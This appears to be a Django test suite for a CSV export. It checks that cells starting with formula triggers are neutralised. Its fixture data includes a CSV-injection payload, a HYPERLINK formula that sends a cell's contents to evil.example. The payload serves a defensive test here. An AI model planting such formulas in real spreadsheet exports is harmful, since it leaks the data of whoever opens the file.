"""S16: exported cells are never evaluated as spreadsheet formulas."""
import csv
import io

from django.core.cache import cache
from django.test import TestCase
from rest_framework.test import APIClient

from apps.audits.models import AuditReport, Recommendation
from apps.core.testing import make_world


class CsvInjectionTests(TestCase):
    def setUp(self):
        cache.clear()
        self.muni, self.dept, self.users, self.report, self.rec = make_world()
        AuditReport.objects.filter(id=self.report.id).update(title="@SUM(A1:A9)")
        payloads = ['=HYPERLINK("http://evil.example/?x="&A1,"x")', "+1+1", "-2+3", "\tTAB", "\rCR", "plain text", "ok = fine"]
        for i, text in enumerate(payloads):
            Recommendation.objects.create(report=self.report, text=text, root_cause=text, risk_level="low", priority_score=i)
        self.client = APIClient()
        self.client.force_authenticate(self.users["audit"])

    def rows(self):
        res = self.client.get("/api/recommendations/export/")
        self.assertEqual(res.status_code, 200)
        content = b"".join(res.streaming_content).decode("utf-8-sig")
        return list(csv.reader(io.StringIO(content)))

    def test_no_cell_starts_with_a_formula_trigger(self):
        rows = self.rows()
        for row in rows[1:]:
            for cell in row:
                self.assertFalse(cell[:1] in ("=", "+", "-", "@", "\t", "\r"), (cell, row))

    def test_neutralised_text_is_kept_readable(self):
        cells = [cell for row in self.rows()[1:] for cell in row]
        self.assertIn("'=HYPERLINK(\"http://evil.example/?x=\"&A1,\"x\")", cells)
        self.assertIn("plain text", cells)
        self.assertIn("ok = fine", cells)

    def test_numbers_stay_numbers(self):
        header, *rows = self.rows()
        priority = header.index("priority_score")
        # The fixture case has priority 0 too.
        self.assertEqual(sorted(int(r[priority]) for r in rows), [0, 0, 1, 2, 3, 4, 5, 6])
